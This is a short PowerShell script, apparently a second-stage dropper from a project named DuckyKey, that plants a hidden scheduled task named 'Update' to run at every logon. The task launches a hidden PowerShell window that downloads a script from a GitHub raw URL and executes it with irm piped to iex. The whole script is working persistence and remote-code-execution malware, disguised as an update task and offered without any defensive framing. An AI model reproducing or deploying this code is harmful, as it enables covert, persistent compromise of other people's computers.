$t = New-ScheduledTaskTrigger -AtLogon;
$a = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '--WindowStyle Hidden -NoProfile -c "irm https://raw.githubusercontent.com/bytequill/DuckyKey/refs/heads/main/server/static/stage2.ps1 | iex"';
$s = New-ScheduledTaskSettingsSet -Hidden -DontStopIfGoingOnBatteries -AllowStartIfOnBatteries;

Register-ScheduledTask -Force -TaskName "Update" -Action $a -Settings $s